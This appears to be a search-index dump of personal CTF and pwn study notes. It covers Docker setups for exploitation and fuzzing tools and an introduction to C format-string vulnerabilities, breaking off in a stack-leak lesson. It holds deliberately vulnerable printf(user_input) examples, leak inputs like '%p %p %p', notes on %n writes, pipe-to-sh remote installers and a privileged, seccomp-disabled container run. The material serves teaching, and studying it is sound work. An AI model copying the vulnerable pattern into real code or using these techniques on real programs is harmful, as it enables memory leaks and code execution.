{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Dreamer","text":"<p>Things i want to remember,</p> <p>Dreamer</p> <ul> <li> <p>Pwn/</p> <ul> <li> <p>Linux/</p> <ul> <li> <p>Docker Environment Setup</p> </li> <li> <p>Format String Vulnerabilities/</p> <ul> <li>Introduction</li> <li>The-Stack-Leak-1</li> <li>The-Stack-Leak-2</li> <li>The-BSS-Leak-2</li> <li>Write-What-Where 1 byte</li> <li>Write-What-Where 8 bytes</li> <li>printf Dynamic padding size (*)</li> <li>Redirect Code Execution to win (GOT-Overwrite)</li> <li>Redirect Code Execution to win (Full Relro+PIE)</li> <li>Format String Attack Once to win (Partial RELRO + no PIE)</li> <li>Format String Attack Once (Partial RELRO + no PIE)</li> <li>Format String Attack Twice (Full Relro + PIE)</li> <li>Formar String Attack No Dollar Payload</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>Fuzzing/</p> <ul> <li>Linux/<ul> <li>Docker Environment Setup</li> </ul> </li> </ul> </li> </ul>"},{"location":"Fuzzing/","title":"Index","text":"<ul> <li>Linux/<ul> <li>Docker Environment Setup</li> </ul> </li> </ul>"},{"location":"Fuzzing/Linux/Fuzzing-environment-setup/","title":"Docker Environment Setup","text":""},{"location":"Fuzzing/Linux/Fuzzing-environment-setup/#introduction","title":"Introduction","text":"<p>Didn't optimized yet. Explanation add later. Build take too long.</p> <pre><code># =========================================================\n#  FUZZING (lightweight) \u2014 Debian 12 slim\n#  AFL++ (LLVM/QEMU/Unicorn), Honggfuzz, pwntools, GEF\n# =========================================================\nFROM debian:bookworm-slim\n\nENV DEBIAN_FRONTEND=noninteractive \\\n    LC_ALL=C.UTF-8 LANG=C.UTF-8\n\n# ---------- Core build &amp; toolchain ----------\nRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\\n    # toolchain\n    build-essential clang lld lldb llvm \\\n    gcc-multilib g++-multilib \\\n    # build tools\n    make cmake ninja-build pkg-config python3 python3-pip python3-setuptools pipx\\\n    git curl ca-certificates file xz-utils unzip \\\n    # debug\n    gdb gdbserver strace ltrace rr \\\n    # libs for honggfuzz/qemu-mode\n    libunwind-dev binutils-dev libbfd-dev libcapstone-dev zlib1g-dev liblzma-dev libglib2.0-dev libpixman-1-dev \\\n    # qemu-mode deps\n    automake autoconf libtool libglib2.0-dev libpixman-1-dev \\\n    # helpers\n    ruby ruby-dev procps net-tools wget curl vim tmux \\\n &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# ---------- Python tooling ----------\nRUN pipx ensurepath &amp;&amp; \\\n    pipx install uv\nRUN pip3 install --no-cache-dir --break-system-packages \\\n    pwntools \\\n    capstone unicorn keystone-engine \\\n    ropper \\\n    z3-solver\n\n# ---------- Tmux ----------\nRUN wget -O /root/.tmux.conf -q \\\n        https://raw.githubusercontent.com/ismailbozkurt/HACKTHEBOX-WRITEUPS/refs/heads/master/.tmux.conf-updated\n\n# ---------- Ruby gems ----------\nRUN gem install --no-document one_gadget seccomp-tools\n\n# ---------- Tools workspace ----------\nRUN mkdir -p /tools &amp;&amp; cd /tools &amp;&amp; \\\n    git clone --depth=1 https://github.com/JonathanSalwan/ROPgadget &amp;&amp; \\\n    git clone --depth=1 https://github.com/niklasb/libc-database\n\n# ---------- GEF (bata) ----------\nRUN cd /tools &amp;&amp; \\\n    git clone --depth=1 https://github.com/bata24/gef &amp;&amp; \\\n    /tools/gef/install.sh || true\n# (Optional pwndbg)\n# RUN cd /tools &amp;&amp; git clone --depth=1 https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh -y || true\n\n# Default .gdbinit: only GEF (bata)\n#RUN printf \"source ~/.gdbinit-gef.py\\n\" &gt;&gt; /root/.gdbinit || true\nRUN wget -q https://raw.githubusercontent.com/bata24/gef/dev/install-uv.sh -O- | sh\nRUN python3 /root/.gef/gef.py --upgrade\n\n# ---------- AFL++ (full features: llvm+qemu+unicorn) ----------\nENV AFL_SKIP_CPUFREQ=1\nRUN git clone https://github.com/AFLplusplus/AFLplusplus /tools/AFLplusplus &amp;&amp; \\\n    make -C /tools/AFLplusplus -j\"$(nproc)\" \\\n      LLVM_CONFIG=llvm-config \\\n      CC=clang CXX=clang++ \\\n      PYTHON3=python3 \\\n      SOURCE_ONLY=0 \\\n      AFL_NO_X86=0 &amp;&amp; \\\n    make -C /tools/AFLplusplus install &amp;&amp; \\\n    cd /tools/AFLplusplus/unicorn_mode &amp;&amp; \\\n    /bin/bash ./build_unicorn_support.sh \n# ---------- Honggfuzz ----------\nRUN git clone https://github.com/google/honggfuzz.git /tools/honggfuzz &amp;&amp; \\\n    make -C /tools/honggfuzz -j\"$(nproc)\"\nENV PATH=\"/tools/honggfuzz:${PATH}\"\n\n# ---------- afl-unicorn (unicorn-mode) ----------\n#RUN cd /tools &amp;&amp; \\\n#   git clone https://github.com/shandianchengzi/unicorn_mode &amp;&amp; \\\n#       cd /tools/unicorn_mode &amp;&amp; \\\n#   bash build_unicorn_support.sh\n#\n# ---------- Clean up ----------\nWORKDIR /host\nRUN apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n</code></pre>"},{"location":"Fuzzing/Linux/Fuzzing-environment-setup/#todo","title":"TODO","text":"<ul> <li> Add explanation</li> <li> Optimize installation steps</li> <li> Change installation process with <code>Ansible</code></li> </ul>"},{"location":"Pwn/PWN-Index/","title":"PWN Index","text":"<ul> <li>Linux/<ul> <li>Docker Environment Setup</li> <li>Format String Vulnerabilities/</li> <li>Introduction</li> <li>The-Stack-Leak-1</li> <li>The-Stack-Leak-2</li> <li>The-BSS-Leak-2</li> <li>Write-What-Where 1 byte</li> <li>Write-What-Where 8 bytes</li> <li>printf Dynamic padding size (*)</li> <li>Redirect Code Execution to win (GOT-Overwrite)</li> <li>Redirect Code Execution to win (Full Relro+PIE)</li> <li>Format String Attack Once to win (Partial RELRO + no PIE)</li> <li>Format String Attack Once (Partial RELRO + no PIE)</li> <li>Format String Attack Twice (Full Relro + PIE)</li> <li>Formar String Attack No Dollar Payload</li> </ul> </li> </ul>"},{"location":"Pwn/Linux/Environment-setup/","title":"Docker Environment Setup","text":""},{"location":"Pwn/Linux/Environment-setup/#introduction","title":"Introduction","text":"<p>Binary exploitation often requires a controlled environment\u2014where specific versions of libraries, kernels, and tools can be isolated and manipulated without affecting your host system. Docker provides a lightweight, reproducible solution to this.</p> <p>Whether you're practicing heap exploitation, ret2libc, or kernel-level fuzzing, using Docker ensures:</p> <ul> <li>A consistent exploit dev environment</li> <li>Easy sharing of challenges or setups    </li> <li>Quick resets after accidental corruption</li> <li>Safer handling of malicious binaries    </li> </ul> <p>In this section, we\u2019ll walk through setting up a Docker environment tailored for Linux binary exploitation.</p> <p>There are several pre-existing environments available on the web for binary exploitation and reverse engineering. However, the shared Docker setup is designed to be optimized and adaptable for various use cases and operating systems.</p> <p>While disassembler tools such as IDA Pro, Binary Ninja, Ghidra, and EDB can technically be integrated into the Docker container, this setup intentionally keeps such GUI-based tools on the host system. This approach ensures better performance, easier GUI handling, and more seamless interaction with large projects\u2014while maintaining a clean and portable CLI-focused environment inside the container.</p>"},{"location":"Pwn/Linux/Environment-setup/#tools-installed-in-the-dockerfile","title":"Tools Installed in the Dockerfile","text":""},{"location":"Pwn/Linux/Environment-setup/#dockerfile","title":"Dockerfile","text":"<pre><code># =========================================================\n#  CTF Exploitation Dockerfile\n#  Base: Ubuntu 24.04\n#  Inspired by LiveOverflow's pwn_docker_example\n# =========================================================\n### \n# Build the docker container -&gt; build.sh \n# Run the docker container -&gt; run.sh \n# Get a shell in the container -&gt; shell.sh\n\nFROM ubuntu:24.04\n\nENV LC_CTYPE=C.UTF-8\nENV DEBIAN_FRONTEND=noninteractive\n\n# ---------------------------------------------------------\n# Copy configs (rizin)\n# ---------------------------------------------------------\nCOPY dot_rizinrc /root/.rizinrc\n\n# ---------------------------------------------------------\n# Core system packages\n# ---------------------------------------------------------\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y --no-install-recommends \\\n        ca-certificates \\\n        curl \\\n        less \\\n        wget \\\n        git \\\n        build-essential \\\n        file \\\n        elfutils \\\n        patchelf \\\n        gdbserver \\\n        jq \\\n        strace \\\n        ltrace \\\n        rubygems \\\n        gcc \\\n        dnsutils \\\n        netcat-traditional \\\n        ipython3 \\\n        gcc-multilib \\\n        net-tools \\\n        vim \\\n        gdb \\\n        gdb-multiarch \\\n        python3-full \\\n        python3-pip \\\n        python3-dev \\\n        libssl-dev \\\n        libffi-dev \\\n        make \\\n        procps \\\n        pipx \\\n        libpcre3-dev \\\n        libdb-dev \\\n        libxt-dev \\\n        libxaw7-dev \\\n        emacs-nox \\\n        pkg-config \\\n        liblzma-dev \\\n        socat \\\n        rr \\\n        clang \\\n        llvm \\\n        lldb \\\n        ruby-dev \\\n        tmux &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n# ---------------------------------------------------------\n# Rust installation (via rustup)\n# ---------------------------------------------------------\nRUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \\\n      | sh -s -- -y --default-toolchain stable\n\n# Cargo binaries -&gt; add to PATH permanently\nENV PATH=\"/root/.cargo/bin:${PATH}\"\n\n# Quick check (not required but useful for build logs)\nRUN rustup --version &amp;&amp; cargo --version\n\n# ---------------------------------------------------------\n# Python tools\n# ---------------------------------------------------------\nRUN pipx ensurepath &amp;&amp; \\\n    pipx install uv &amp;&amp; \\\n    pip3 install --break-system-packages \\\n        capstone \\\n        requests \\\n        pwntools \\\n        r2pipe \\\n        keystone-engine \\\n        unicorn \\\n        ropper \\\n        meson \\\n        ninja \\\n        z3-solver \\\n        pyvex \\\n        archinfo \\\n        angr \\\n        frida-tools \\\n        angrop\n\n# ---------------------------------------------------------\n# Exploitation tools\n# ---------------------------------------------------------\nRUN mkdir /tools &amp;&amp; cd /tools &amp;&amp; \\\n    git clone https://github.com/JonathanSalwan/ROPgadget &amp;&amp; \\\n    git clone https://github.com/niklasb/libc-database &amp;&amp; \\\n    wget -O /root/.tmux.conf -q \\\n        https://raw.githubusercontent.com/ismailbozkurt/HACKTHEBOX-WRITEUPS/refs/heads/master/.tmux.conf-updated &amp;&amp; \\\n    git clone --recurse-submodules https://github.com/rizinorg/rizin &amp;&amp; \\\n    cd rizin &amp;&amp; meson build &amp;&amp; ninja -C build &amp;&amp; ninja -C build install &amp;&amp; \\\n    cd /tools &amp;&amp; git clone https://github.com/radareorg/radare2 &amp;&amp; \\\n    radare2/sys/install.sh\n\n# ---------------------------------------------------------\n# one_gadget (Ruby gem)\n# ---------------------------------------------------------\nRUN gem install one_gadget\nRUN gem install seccomp-tools\n# ---------------------------------------------------------\n# Rust-based exploitation tools\n# ---------------------------------------------------------\nRUN cargo install ropr\nRUN cargo install pwninit \n\n# ---------------------------------------------------------\n# pwndbg &amp; gef\n# ---------------------------------------------------------\nRUN cd /tools &amp;&amp; \\\n    git clone https://github.com/pwndbg/pwndbg &amp;&amp; \\\n    cd pwndbg &amp;&amp; ./setup.sh &amp;&amp; \\\n    cd /tools &amp;&amp; git clone https://github.com/bata24/gef &amp;&amp; \\\n    cd gef &amp;&amp; bash ./install.sh\n\n# ---------------------------------------------------------\n# Copy gdbinit configuration\n# ---------------------------------------------------------\nCOPY dot_gdbinit /root/.gdbinit\n</code></pre>"},{"location":"Pwn/Linux/Environment-setup/#binary-exploitation-reverse-engineering","title":"Binary Exploitation &amp; Reverse Engineering","text":"Tool Description <code>gdb</code> / <code>gdb-multiarch</code> GNU Debugger, multiarch supports 32-bit/64-bit &amp; ARM targets <code>pwndbg</code> A GDB enhancement for exploit dev with context display, heap inspection, etc. <code>gef</code> GDB Enhanced Features \u2013 an alternative to pwndbg, especially good for heap debugging <code>gdbserver</code> Remote debugging helper for GDB <code>ROPgadget</code> Finds ROP/JOP gadgets in binaries for building ROP chains <code>ropper</code> Another powerful ROP gadget finder with symbol and section parsing <code>one_gadget</code> Extracts useful libc one-gadget RCE offsets (e.g. <code>execve(\"/bin/sh\")</code>) <code>libc-database</code> A tool to match remote libc versions using leaked addresses <code>capstone</code> Lightweight multi-architecture disassembly engine <code>unicorn</code> Lightweight multi-architecture CPU emulator <code>keystone-engine</code> Lightweight assembler supporting multiple architectures <code>z3-solver</code> The Z3 theorem solver from Microsoft \u2013 useful for symbolic execution <code>pyvex</code>, <code>archinfo</code> Used by angr or similar frameworks for binary analysis <code>ltrace</code> / <code>strace</code> Traces library calls and syscalls respectively <code>file</code>, <code>elfutils</code> Basic tools for ELF file inspection <code>patchelf</code> Modify ELF binaries \u2013 e.g. change interpreter, add/remove sections <code>rizin</code> Reverse engineering framework (a fork of radare2 with improvements) <code>radare2</code> Lightweight but powerful reverse engineering framework <code>r2pipe</code> Python bindings for interacting with rizin/radare2 from scripts"},{"location":"Pwn/Linux/Environment-setup/#compilation-development","title":"Compilation &amp; Development","text":"Tool Description <code>build-essential</code>, <code>gcc</code>, <code>make</code> Standard compilation toolchain <code>gcc-multilib</code> Enables compiling 32-bit binaries on 64-bit systems <code>python3-full</code>, <code>python3-dev</code> Full Python3 environment with development headers <code>pip</code>, <code>pipx</code>, <code>uv</code> Python package managers \u2013 <code>pipx</code> installs Python apps in isolation <code>cargo</code>, <code>rust</code> Rust language support for tools like <code>ropr</code> <code>ropr</code> Rust-based ROP gadget search tool"},{"location":"Pwn/Linux/Environment-setup/#networking-utilities","title":"Networking &amp; Utilities","text":"Tool Description <code>netcat-traditional</code> Simple networking tool for reverse shells and socket testing <code>dnsutils</code> Tools like <code>dig</code> for DNS querying <code>ipython3</code> Interactive Python shell for testing logic and payloads <code>jq</code> Command-line JSON parser <code>curl</code>, <code>wget</code> Download files from the internet <code>procps</code> Tools like <code>ps</code>, <code>top</code> etc. for process inspection <code>bsdmainutils</code> Includes <code>hexdump</code>, <code>column</code>, and other useful tools <code>vim</code>, <code>emacs-nox</code>, <code>tmux</code> Editors and terminal multiplexer for working inside the container <code>net-tools</code> Legacy networking tools (<code>ifconfig</code>, <code>netstat</code>, etc.)"},{"location":"Pwn/Linux/Environment-setup/#dot_gdbinit","title":"dot_gdbinit","text":"<p>This <code>.gdbinit</code> file configures GDB to automatically load Pwndbg, a powerful debugging plugin for binary exploitation. The commented line provides an alternative to load GEF (GDB Enhanced Features) manually, allowing easy switching between the two tools depending on preference.</p> <pre><code>source /tools/pwndbg/gdbinit.py\n#python sys.path.insert(0, \"/root/.gef\"); from gef import *; Gef.main()\n</code></pre>"},{"location":"Pwn/Linux/Environment-setup/#dot_rizin","title":"dot_rizin","text":"<p>This <code>.rizinrc</code> file configures Rizin with user preferences for disassembly and UI. It enables inline comments (<code>asm.cmt.right</code>), pseudo-instructions (<code>asm.pseudo</code>), sets the color theme to <code>darkda</code>, forces UTF-8 output (<code>scr.utf8</code>), and allows slower but more accurate debugging (<code>dbg.slow</code>).</p> <pre><code>e asm.cmt.right=true\ne asm.pseudo=true\neco darkda\ne scr.utf8=true\ne dbg.slow=true\n</code></pre>"},{"location":"Pwn/Linux/Environment-setup/#buildsh","title":"build.sh","text":"<p>This <code>build.sh</code> script is a simple wrapper that builds the Docker image using the specified <code>Dockerfile</code>. It tags the resulting image as <code>docker-binaryexploitation:ubuntu24.04</code>, making it easier to reference and run later.</p> <pre><code>docker build -f Dockerfile -t docker-binaryexploitation:ubuntu24.04 .\n</code></pre>"},{"location":"Pwn/Linux/Environment-setup/#runsh","title":"run.sh","text":"<p>This <code>run.sh</code> script launches the Docker container in the background with privileges suited for debugging and exploitation tasks. It:</p> <ul> <li>Mounts the current directory to <code>/host</code> and a <code>logs/</code> folder to <code>/logs</code></li> <li>Enables <code>SYS_PTRACE</code> and disables seccomp for full debugging capability</li> <li>Runs in detached mode (<code>-d</code>) with the name <code>docker-binaryexploitation</code></li> <li>Uses the built image <code>docker-binaryexploitation:ubuntu24.04</code></li> <li>Grants <code>--privileged</code> access to allow low-level operations such as ptrace, network manipulation, and device access</li> </ul> <pre><code>#!/bin/sh\ndocker run --rm \\\n  -v \"$(pwd):/host\" \\\n  -v \"$(pwd)/logs:/logs\" \\\n  --cap-add=SYS_PTRACE \\\n  --security-opt seccomp=unconfined \\\n  -d --name docker-binaryexploitation \\\n  -it docker-binaryexploitation:ubuntu24.04\n</code></pre>"},{"location":"Pwn/Linux/Environment-setup/#shellsh","title":"shell.sh","text":"<p>This <code>shell.sh</code> script opens an interactive bash shell inside the running <code>docker-binaryexploitation</code> container. It allows you to interact directly with the container\u2019s environment as if you were logged into a Linux system.</p> <pre><code>#!/bin/sh\ndocker exec -it docker-binaryexploitation /bin/bash\n</code></pre>"},{"location":"Pwn/Linux/Environment-setup/#references","title":"References","text":"<ul> <li>https://ctf-wiki.org/pwn/linux/user-mode/environment/</li> <li>https://github.com/LiveOverflow/pwn_docker_example</li> </ul>"},{"location":"Pwn/Linux/Environment-setup/#todo","title":"TODO","text":"<ul> <li> TODO: The Docker installation process will be replaced with <code>Ansible</code></li> </ul>"},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/","title":"01 - Introduction to Format Specifiers","text":"","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#what-are-format-specifiers","title":"What Are Format Specifiers?","text":"<p>In programming\u2014especially in C and C-like languages\u2014format specifiers are placeholders used inside format strings to tell the program how to interpret and display data.</p> <p>When you use functions like <code>printf</code>, <code>scanf</code>, <code>fprintf</code>, or <code>sprintf</code>, the format specifiers act as instructions for how values should be read from memory (inputs) or written to output (printing).</p> <p>Think of them as a translation guide between raw data in memory (binary) and the way humans want to see or interact with that data (text, numbers, characters, etc.).</p>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#why-do-format-specifiers-exist","title":"Why Do Format Specifiers Exist?","text":"<ol> <li>Data Representation </li> <li>Computers store everything as binary values, but humans need readable forms (decimal, hex, string, character).  </li> <li> <p>Example: <code>65</code> in ASCII is stored as <code>01000001</code> in memory but represented as the character <code>'A'</code>.</p> </li> <li> <p>Type Safety and Interpretation </p> </li> <li>A single piece of memory can be interpreted in many ways:  <ul> <li>As an integer (<code>%d</code>)  </li> <li>As a character (<code>%c</code>)  </li> <li>As a string pointer (<code>%s</code>)  </li> </ul> </li> <li> <p>Format specifiers tell the function what type of data to expect.</p> </li> <li> <p>Flexibility in Output </p> </li> <li>You can control how data looks:  <ul> <li>Width (<code>%10d</code> \u2192 pad integer with spaces)  </li> <li>Precision (<code>%.2f</code> \u2192 2 decimal places)  </li> <li>Base (<code>%x</code> for hex, <code>%o</code> for octal)  </li> </ul> </li> <li> <p>This gives developers control over formatting for readability or strict data output.</p> </li> <li> <p>Efficiency &amp; Reuse </p> </li> <li>Instead of writing custom code to convert every data type to string form, format specifiers provide a universal mechanism.</li> </ol>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#visual-how-format-specifiers-work","title":"Visual: How Format Specifiers Work","text":"","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#format-specifiers-cc","title":"Format Specifiers (C/C++)","text":"","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#commonly-used","title":"Commonly Used","text":"Specifier Meaning Example Output <code>%d</code> / <code>%i</code> Signed integer (default <code>int</code>) <code>printf(\"%d\", 42);</code> <code>42</code> <code>%u</code> Unsigned integer (<code>unsigned int</code>) <code>printf(\"%u\", 42);</code> <code>42</code> <code>%x</code> / <code>%X</code> Unsigned hex (lower/upper) <code>printf(\"%x\", 255);</code> <code>ff</code> <code>%o</code> Unsigned octal <code>printf(\"%o\", 8);</code> <code>10</code> <code>%f</code> Floating-point (decimal) <code>printf(\"%.2f\", 3.14159);</code> <code>3.14</code> <code>%e</code> / <code>%E</code> Scientific notation <code>printf(\"%e\", 314159.0);</code> <code>3.141590e+05</code> <code>%c</code> Single character <code>printf(\"%c\", 65);</code> <code>A</code> <code>%s</code> String (null-terminated <code>char*</code>) <code>printf(\"%s\", \"Hello\");</code> <code>Hello</code> <code>%p</code> Pointer (memory address) <code>printf(\"%p\", ptr);</code> <code>0x7ffeefbff5c8</code> <code>%n</code> Write number of characters printed so far into an integer pointer <code>int x; printf(\"test%n\",&amp;x);</code> <code>x = 4</code>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#length-modifiers-for-largersmaller-types","title":"Length Modifiers (for larger/smaller types)","text":"Specifier Meaning Example Output <code>%ld</code> <code>long int</code> <code>printf(\"%ld\", 1234567890L);</code> <code>1234567890</code> <code>%lu</code> <code>unsigned long int</code> <code>printf(\"%lu\", 1234567890UL);</code> <code>1234567890</code> <code>%lx</code> / <code>%lX</code> <code>unsigned long int</code> (hex) <code>printf(\"%lx\", 3735928559UL);</code> <code>deadbeef</code> <code>%lld</code> <code>long long int</code> <code>printf(\"%lld\", 9223372036854775807LL);</code> <code>9223372036854775807</code> <code>%llu</code> <code>unsigned long long int</code> <code>printf(\"%llu\", 18446744073709551615ULL);</code> <code>18446744073709551615</code> <code>%llx</code> <code>unsigned long long int</code> (hex) <code>printf(\"%llx\", 3735928559ULL);</code> <code>deadbeef</code> <code>%hd</code> <code>short int</code> <code>printf(\"%hd\", (short)32000);</code> <code>32000</code> <code>%hu</code> <code>unsigned short int</code> <code>printf(\"%hu\", (unsigned short)65000);</code> <code>65000</code> <code>%hhd</code> <code>signed char</code> <code>printf(\"%hhd\", (char)120);</code> <code>120</code> <code>%hhu</code> <code>unsigned char</code> <code>printf(\"%hhu\", (unsigned char)250);</code> <code>250</code> <code>%Lf</code> <code>long double</code> (extended precision float) <code>printf(\"%Lf\", 3.141592653589793238L);</code> <code>3.141593</code>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#visual-data-sizes-in-cc","title":"Visual: Data Sizes in C/C++","text":"","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#special-format-specifier","title":"Special Format Specifier: <code>%*</code>","text":"<p>The <code>%*</code> specifier is used for dynamic width or precision. Instead of hardcoding width/precision in the format string, the value is taken from an argument in the stack.</p>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#usage-for-width","title":"Usage for width","text":"<pre><code>printf(\"%*d\", 5, 42);\n</code></pre> <ul> <li> <p>Here, <code>5</code> is the width (taken from arguments).</p> </li> <li> <p>Output \u2192 <code>\" 42\"</code></p> </li> </ul> <p>Equivalent to:</p> <p><code>printf(\"%5d\", 42);</code></p>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#usage-for-precision","title":"Usage for precision","text":"<p><code>printf(\"%.*f\", 3, 3.14159265);</code></p> <ul> <li> <p>Here, <code>3</code> is the precision (taken from arguments).</p> </li> <li> <p>Output \u2192 <code>3.142</code></p> </li> </ul> <p>Equivalent to:</p> <p><code>printf(\"%.3f\", 3.14159265);</code></p>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#security-note","title":"Security Note","text":"<p>The <code>%*</code> specifier is very dangerous when used with uncontrolled user input in format string vulnerabilities:</p> <ul> <li> <p>The attacker can control how many bytes get printed, which directly influences <code>%n</code> exploitation.</p> </li> <li> <p><code>%*</code> allows precise control over padding \u2192 enabling exact writes to memory.</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#extended-controls-with-modifiers","title":"Extended Controls with Modifiers","text":"<p>Format specifiers can be modified with flags, width, and precision:</p> <ul> <li> <p>Width: <code>\"%5d\"</code> \u2192 pad number with spaces if shorter (e.g., <code>42</code> \u2192 <code>\" 42\"</code>)</p> </li> <li> <p>Zero-padding: <code>\"%05d\"</code> \u2192 <code>\"00042\"</code></p> </li> <li> <p>Left-justified: <code>\"%-5d\"</code> \u2192 <code>\"42 \"</code></p> </li> <li> <p>Precision: <code>\"%.3f\"</code> \u2192 <code>3 decimal places</code></p> </li> <li> <p>Length modifiers:</p> <ul> <li> <p><code>%ld</code> \u2192 long integer</p> </li> <li> <p><code>%lld</code> \u2192 long long integer</p> </li> <li> <p><code>%hhd</code> \u2192 signed char</p> </li> </ul> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#why-attackers-care-about-format-specifiers","title":"Why Attackers Care About Format Specifiers","text":"<p>While they were originally designed for convenience and type handling, format specifiers are also a powerful attack vector when misused.</p> <ul> <li> <p><code>%x</code> and <code>%p</code> \u2192 can leak memory contents.</p> </li> <li> <p><code>%s</code> \u2192 can dereference arbitrary memory addresses, leading to info disclosure.</p> </li> <li> <p><code>%n</code> \u2192 can write to arbitrary memory, turning a simple bug into code execution.</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#safe-usage-vs-unsafe-usage","title":"Safe Usage vs. Unsafe Usage","text":"<p>Format strings are not inherently dangerous \u2014 they only become a problem when user-controlled input is passed directly as the format string itself.  </p>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#safe-usage","title":"Safe Usage","text":"<p>The correct approach is to always fix the format string and pass user input as an argument:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char user_input[] = \"Hello\";\n    printf(\"%s\\n\", user_input);  // \u2705 Safe: format string is constant\n    return 0;\n}\n</code></pre> <p>Why is this safe?</p> <ul> <li> <p>The format string <code>\"%s\\n\"</code> is explicitly defined.</p> </li> <li> <p>User input is only substituted into that placeholder.</p> </li> <li> <p>The compiler knows what to expect and enforces type checking.</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#unsafe-usage","title":"Unsafe Usage","text":"<p>The dangerous case happens when the user input itself is treated as the format string: <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char user_input[100];\n    scanf(\"%99s\", user_input);\n    printf(user_input);  // \u274c Unsafe: user controls format string\n    return 0;\n}\n</code></pre></p> <p>Why is this unsafe?</p> <ul> <li> <p>If the user types <code>\"Hello\"</code>, the output is fine.</p> </li> <li> <p>But if they type <code>\"%x %x %x\"</code>, the program will attempt to read values off the stack and print them \u2192 information leak.</p> </li> <li> <p>If they use <code>\"%n\"</code>, they can even write to memory.</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#how-format-string-vulnerabilities-happen","title":"How Format String Vulnerabilities Happen","text":"<p>Format string vulnerabilities occur when:</p> <ol> <li> <p>Developers assume input is harmless text     They forget that <code>%</code> characters inside input are interpreted by <code>printf</code> as instructions.</p> </li> <li> <p>Input is used directly as a format string</p> <p><code>printf(user_input);   // \u274c Vulnerable printf(\"%s\", user_input); // \u2705 Safe</code></p> </li> <li> <p>Compiler cannot always protect you</p> <ul> <li> <p>Modern compilers (with <code>-Wformat-security</code>) can warn you about format string issues.</p> </li> <li> <p>But if the format string is indirectly passed (e.g., via another function or from a file), the compiler may not catch it.</p> </li> </ul> </li> </ol>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#example-compiler-misses-this","title":"Example: Compiler Misses This","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid log_message(const char *msg) {\n    printf(msg);  // \u274c Unsafe\n}\n\nint main() {\n    char buffer[100];\n    scanf(\"%99s\", buffer);\n    log_message(buffer);  // Input flows unchecked\n    return 0;\n}\n</code></pre> <p>Even if compiled with <code>-Wformat-security</code>, the warning may not trigger because <code>log_message</code> looks like a normal function call, not direct <code>printf</code>.</p>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/01-Introduction/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Always provide a fixed format string.</li> <li>Treat any <code>printf(user_input)</code> pattern as dangerous.</li> <li>Even if it looks like \"just printing text,\" format specifiers give attackers powerful tools to:<ul> <li>Leak stack/heap memory</li> <li>Access arbitrary memory</li> <li>Overwrite values in memory</li> </ul> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/","title":"02 Format String Attack - The Stack Leak 1","text":"","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/02-Format-String-Attack-The-Stack-Leak-1/#peeking-into-the-stack","title":"Peeking into the Stack","text":"<p>One of the most common and powerful abilities provided by format string vulnerabilities is information disclosure. By carefully choosing format specifiers like <code>%x</code> and <code>%p</code>, attackers can read values directly from the stack.</p> <p>Using <code>%p</code> works similarly but prints the value as a pointer (address):</p> <pre><code>printf(\"%p %p %p\\n\");\n</code></pre> <p>Example Output:</p> <p><code>0x7f4aaaf82643 (nil) 0x7f4aaae9a574 0x25</code></p> <ul> <li> <p>These are raw values taken from the stack.</p> </li> <li> <p>With enough 